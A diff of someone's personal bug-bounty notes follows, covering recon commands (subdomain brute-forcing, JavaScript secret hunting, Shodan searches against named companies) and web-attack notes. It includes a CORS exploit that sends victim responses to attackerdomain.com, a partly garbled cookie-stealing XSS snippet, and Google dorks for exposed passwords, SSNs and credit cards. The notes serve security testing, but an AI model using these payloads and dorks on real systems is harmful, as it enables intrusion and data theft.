@@ -104,6 +104,11 @@ sublist3r example.com -o output ... $ cat output foo.example.com bar.example.com
   python3 sublist3r.py -d tesla.com -b optional 
   
   
+   for hidden subdomain 
+#From https://github.com/allyshka/vhostbrute
+vhostbrute.py --url="example.com" --remoteip="10.1.1.15" --base="www.example.com" --vhosts="vhosts_full.list"
+  
+  
 amass
 amass enum -asn -d tesla.com
 amass enum [-active] [-ip] -d target
@@ -147,6 +152,7 @@ amass enum -d target.com -o /filepath/subdomains.txt
   gau
   echo "url" | gau | tee gau.txt
   cat gau.txt | grep ? | tee param.txt    
+  gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'  // no output, checkmagain later
      
      
      JAVASCRIPTS FILES
@@ -176,14 +182,51 @@ amass enum -d target.com -o /filepath/subdomains.txt
      arjun -u tesla.com
      
      
+ check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
+ ./cruze.sh example.com
      
-    WAYBACKURL FOR BUG HUNTING
+
+      Javascript Enumeration
+  
+cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | waybackurls > ~/Desktop/urls.txt
+ 
+ pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
+ 
+ Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
+ 
+ 
+ onliner to extract endpoints from JS files of a given host
+ ./js at my kali/scan/
+ 
+ using subjs
+ $ cat urls.txt | subjs 
+$ subjs -i urls.txt
+
+content discovery/params discovery  for bug hunting
+
+check for  python3 SecretFinder.py
+
+
+ waybackurls target.com | grep "\\.js"|uniq|sort
+ waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt        //give me output
+                                       $ cat hosts.txt | gau | subjs                     // no output   check later
+
+
+
+keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.
+
+
+ getting javasacript files
+ source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
+ 
+
+ WAYBACKURL FOR BUG HUNTING
     waybackurl  (git the github usage)
     echo "url" | waybackurl
     
+
+
     waybackmachine
-
-
 ttps://web.archive.org/web/*/facebook.com/*
 .zip
 .backup
@@ -269,29 +312,11 @@ gobuster vhost -u (url)  -w /usr/share/wordlist/seclists/Discovery/DNS/subdomain
  ./dnsrecon.py -d securitytrails.com
  
 
- for hidden subdomain 
-#From https://github.com/allyshka/vhostbrute
-vhostbrute.py --url="example.com" --remoteip="10.1.1.15" --base="www.example.com" --vhosts="vhosts_full.list"
-
-
-
    eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
    
-   
-   
 
 
-
-
-
-
-
-
-
-
-
-
-whoxy.com   //asset discovery  for root domain
+      whoxy.com   //asset discovery  for root domain
 
 Perform reverse DNS lookups on the IP’s you discover through these search engines and see if you can identify IPs, ASN’s, root domains, or other unlinked company owned assets. (shodan , censys, and whoxy.com)
 
@@ -300,7 +325,28 @@ Ports:8443, 8080 Title: "Dashboard[Jenkins]" Product: Tomcat Hostname: example.c
 
 
 
-Shodan for bug hunting
+     SHODAN FOR BUG HUNTING 
+     assest discovery using shodan cli                    check nahamesec video on shodan
+     
+ shodan init api-key
+     shodan domain -h
+     shodan domain -D url -S
+     shodan jq -r '.hostnames' (filename)
+     shodan jq -cs '.[0] (filename) | jq -r
+     shodan jq -r '.ip_str' (filename) | httpx -titles  -port 443,80,8080              \\ ip address of the domain name
+     shodan search org:\"ford motors\" | --fields ip_str, port,http.title
+       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title                     being creative with your search  || \!port:80,443 this means dont show 
+       shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :"
+        shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei                         pass to other tools
+         shodan search org:\"ford motors\" \!port:80,443 | --fields ip_str, port,http.title | awk '{print $1, $2 }'  tr " " :" | nuclei  | httpx -title -follow-host-redirect   
+         
+          shodan search search ssl:form.com  --fields ip_str, port,http.title | awk '{print $1, $2}' | tr " " " : "
+         shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser   
+          shodan search search asn:AS3389  --fields hostnames | tr ";" "\n" | sort -u | domainparser | sort u | xargs -I{} shodan search ssl:{} -fields ip_str,port
+          
+          shodan search org:target.com hostnames:localhost
+         
+     
 https://www.shodan.io/search?query=ssl%3A%22Paypal%22
 
 https://www.shodan.io/search?query=ssl%3A%22Paypal%22+200
@@ -316,6 +362,9 @@ https://www.shodan.io/search?query=html%3A%22Dashboard+Jenkins%22
 
 Broad domain search w/ negative search
 site:example.com -www -shop -share -ir -mfa
+
+ site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv
+
 
 google dorks
 
@@ -479,45 +528,7 @@ Check robots.txt page
  END End 
 
  
- Javascript Enumeration
- burpsuite -> sitemap -> enagement-> find scritps -> export options-> save scripts   //burp pro
-  
-cat domains.txt | waybackurls > urls.txt           or     cat domains.txt | waybackurls > ~/Desktop/urls.txt
- 
- pip install jsbeautifier. Then, you run it with js-beautify -o outfile.txt scripts.txt. This will output the file outfile.txt which you can easily browse through.
- 
- Now that we have a readable version of all the JavaScript code in one place, I like to start with Grep to get a feel of what I am expecting. The general command is grep --color -i term outfile.txt. You just change the word term with what you’re looking for. For example, try words like secret, admin, password or token to find hardcoded secrets. Alternatively, you can use a path prefix to look for endpoints. Say you noticed that all API endpoints start with /api/v1. In this case, you can substitute the word term in the grep command with /api/v1 to collect all the API endpoints.
- 
- 
- 
- onliner to extract endpoints from JS files of a given host
- ./js at my kali/scan/
- 
- using subjs
- $ cat urls.txt | subjs 
-$ subjs -i urls.txt
 
-content discovery/params discovery  for bug hunting
-
-check for  python3 SecretFinder.py
-
-
- waybackurls target.com | grep "\\.js"|uniq|sort
- waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt        //give me output
-                                       $ cat hosts.txt | gau | subjs                     // no output   check later
-
-gau $mytarget|egrep -iv '\.json'|grep -iE '\.js'|antiburl|awk '{print $4}' | xargs -I %% bash -c 'python3 SecretFinder.py -i %% -o cli -r "$anything"'  // no output, checkmagain later
-
-keywords to look for  in javascript files:pathname url:, POST, api, GET, setRequestHeader, send( (yes with just one (, as it's used when making Ajax requests!. .headers, onreadystatechange, var {xyz} = , getParameter(), parameter, .theirdomain.com, apiKey. and also postMessage, messageListener, .innerHTML, document.write(, document.cookie, location.href, redirectUrl, window.hash.
-
-
- getting javasacript files
- source code/developers tools -> search for .js , then copy and paste in vscode and search for all ** word 
- 
-
-
- check  ./cruze         //cruze : a script to automate all the lazy recon flow of the hunter with the tools great people have developed.
- ./cruze.sh example.com
  
  
  BOKEN LINK HIJACKING
@@ -532,6 +543,8 @@ Now you need to check if company has the page or not , if no then register as th
 
    BROKEN ACCESS CONTROL
    ALWAYS REPLACE BOTH THE COOKIE AND REFERER OF AN AUTHICATED( ORIGINAL PASSWORD AND USERNAME ) REQUEST INTO AN UNAUTHENCATED (FAKE PASSWORD AND FAKE USERNAME) IN BURP
+   
+   TEASTE FOR BROWERS CACHE WEAKNESS , this is by loginin and also log out  of you appilcation and then click the browers back botton to verify if you could login
 
 
 
@@ -903,7 +916,11 @@ Change the user’s security questions
  
  session hijacking payload  on an form 
  <script>
-var sessionId = document.cookie.match(/sessionId=(.*?)(;|$)/)[1]
+var sessionId = document.
+
+
+
+ie.match(/sessionId=(.*?)(;|$)/)[1]
 </script>
 
 payload for a data theft using xss
@@ -993,7 +1010,7 @@ cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|p
 
 
 
-  CORS  BYpassing / Misconfigured
+  CORS  BYPASSING / MISCONFIGURED
   
   hunting 1 (single target)
   
@@ -1092,34 +1109,20 @@ function reqListener() {
     location='https://attackerdomain.com/?response='+this.responseText; 
 };
   
-  
-  
-   \\HOW TO IDENTIFY A WEBSITE THAT IS VUNERABLE TO CORS MISCONIFIGATION  //
- 1)CHECK RESPONSE HEADERS: 
- Examine the HTTP response headers of the website. Look for the presence of CORS-related headers. 
-  
-  \\ KEY HEADER TO CHECK //
-Access-Control-Allow-Origin: This header specifies which origins are permitted to access the resources on the website. If it is set to a wildcard (*) or is too permissive, it can indicate a vulnerability. no browers acceo]pt using only wild card *
-    NOTE ON THIS
-   When responding to a credentialed request,  server must specify a domain, and cannot use wild carding
-In other words, using a wildcard effectively disables the Allow-Credentials header.
-
-As a result of these limitations, many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value. This is the single most common CORS vulnerability. If you see a HTTP response with any Access-Control-* headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.
+  many servers programmatically generate the Access-Control-Allow-Origin header based on the user-supplied Origin value. This is the single most common CORS vulnerability. If you see a HTTP response with any Access-Control-* headers but no origins declared, this is a strong indication that the server will generate the header based on your input. Other servers will only send CORS headers if they receive a request containing the Origin header, making associated vulnerabilities extremely easy to miss.
 
 
 
  BLACK BOX CORS TESTING 
   TEST THE APPLICTAION FOR DYNAMIC GENERATION
-  	does it reflect the user -supplied ACAO header 
-  	does it only validate on the start/ end of a specific string ? .  the results from wrong regex expresion 
-  	does it allow the null origin
+  	does it reflect the user -supplied ACAO header  If it is set to a wildcard (*) or is too permissive, it can indicate a vulnerability        // origin :https://attacker.com    0R  *
+  	does it only validate on the start/ end of a specific string ? .  the results from wrong regex expresion   // origin :https://attacker.com.smart.com    OR  https://smart.attacker.com
+  	does it allow the null origin        ///    origin: null
   	does it restrict the protocol
-  	does it allow credential when option 2 ( does it only validate on the start/ end of a specific string ) is true
+  	does it allow credential when option 2 ( does it only validate on the start/ end of a specific string ) is true   // no browers accept this as true using only wild card * it invalidate it 
+  //	When responding to a credentialed request,  server must specify a domain, and cannot use wild carding
    
-   
-
-
-
+  
 
 Access-Control-Allow-Methods: This header defines which HTTP methods (e.g., GET, POST) are allowed in cross-origin requests.
 Access-Control-Allow-Headers: This header specifies the HTTP headers that can be used in the actual request.
